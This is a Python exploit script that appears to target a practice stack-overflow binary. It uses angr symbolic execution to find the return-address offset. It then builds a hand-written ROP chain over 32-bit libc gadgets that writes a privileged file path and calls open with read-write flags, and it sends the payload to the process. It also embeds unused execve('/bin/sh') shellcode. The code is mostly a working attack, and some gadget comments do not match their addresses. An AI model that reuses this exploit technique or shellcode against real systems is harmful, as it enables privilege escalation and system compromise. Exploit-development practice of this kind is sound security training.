import angr, argparse, IPython, angrop
import claripy
from pwn import *

def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True
def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''

    # get all the symbolic bytes from stdin
    stdin = state.posix.stdin

    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('argv1'):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr
shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
def main():
    elf_binary ="vuln_stackoverflow-medium"
    p = angr.Project(elf_binary, load_options={'auto_load_libs': False})

    exploited = p.loader.main_object.get_symbol(
        'svcunix_create_vuln')

    goal = p.loader.main_object.get_symbol(
        'goal')

    argv1 = claripy.BVS("argv1",8*500)
    #state = p.factory.full_init_state(args=[elf_binary,argv])
    #state = p.factory.entry_state(args=[elf_binary,argv1])

    state = p.factory.entry_state(args=[elf_binary],stdin=argv1)
    #state = p.factory.call_state(exploited.rebased_addr,argv1)#addr=exploited.rebased_addr
    state.libc.buf_symbolic_bytes = 0x200
    state.libc.max_variable_size = 0x200
    state.libc.max_str_len = 205# fuck that shit, our string can be bigger than the default of 128, only at around 140bytes will the bof trigger
    #for i in range(0,200):
    #    state.add_constraints(argv1.get_byte(i) != 0)

    simgr = p.factory.simulation_manager(state, save_unconstrained=True)
    simgr.stashes['mem_corrupt']  = []

    
    def check_mem_corruption(simgr):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"ABCD"]):
                    path.add_constraints(path.regs.pc == b"ABCD")
                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')
        return simgr
    
    simgr.explore(step_func=check_mem_corruption)

    IPython.embed()

    ep = simgr.mem_corrupt[0]

    input = ep.solver.eval(argv1,cast_to=bytes)

    pointer_offset = input.find(b"ABCD"[::-1])

    print("offset",pointer_offset)

   # 
    #
    libc_off = 0xf7c00000
    p = angr.Project("/usr/lib32/libc.so.6",main_opts={'base_addr': libc_off})

    

    rop = p.analyses.ROP()
    rop.save_gadgets("gadgets")
    #rop.set_badbytes([0x00])
    #rop.find_gadgets()
    

    str1 = "/home/privileged/stackoverflow-medium"
    chain = rop.write_to_mem(0x804b016, b"/home/privileged/stackoverflow-medium")+ rop.func_call("open", [0x804b016,os.O_RDWR])
    chain = rop.set_regs(rax=0x1337133713371337)
    #print(chain)

    code_base = libc_off
    chain = b""
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b016)
    chain += p32(0x6d6f682f)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b01a)
    chain += p32(0x72702f65)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b01e)
    chain += p32(0x6c697669)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b022)
    chain += p32(0x64656765)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b026)
    chain += p32(0x6174732f)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b02a)
    chain += p32(0x766f6b63)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b02e)
    chain += p32(0x6c667265)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b032)
    chain += p32(0x6d2d776f)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(0x804b036)
    chain += p32(0x75696465)
    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 

    #only pop ecx
    pop_ecx = 0x0011b345
    #chain += p32(code_base + 0x129a35)      # pop ecx; pop eax; ret 
    chain += p32(code_base + pop_ecx)      # pop ecx; pop eax; ret 
    chain += p32(0x804b03a)
    #chain += p32(0xffffff6d)

    #last word
    #null last word
    xor_eax_eax = 0x000360f4
    chain += p32(code_base + 0x8c7ac)      # xor eax, eax; ret 
    chain += p32(0x804b03a)
    chain += p32(0xffffff6d)


    chain += p32(code_base + 0x8c7ac)      # xor eax, eax; ret 
    chain += p32(0x804b03a)
    chain += p32(0xffffff6d)

    

    #
    to_ecx_low = 0x00031b79 #add byte ptr [ecx], al ; ret

    chain += p32(code_base + to_ecx_low)


    #
    #pop_eax = 0x00129a15 #pop eax ; ret

    #chain += p32(code_base + pop_eax)

    chain += p32(code_base + 0x8c7ac)       # mov dword ptr [ecx], eax; mov eax, edx; ret 
    chain += p32(code_base + 0x10bd10)
    chain += p32(code_base + 0x1f078)       # pop ebx; pop esi; ret 
    chain += p32(0x804b016)
    chain += p32(0x2)

    with open("pay","wb") as f:
        f.write(pointer_offset*b"a"+chain)

    chan = process(elf_binary)
    chan.sendline(pointer_offset*b"a"+chain)
    chan.interactive()

    for buf_addr in find_symbolic_buffer(ep, len(shellcode)):
        print("aadr",buf_addr)

    
    
if __name__ == "__main__":
    main()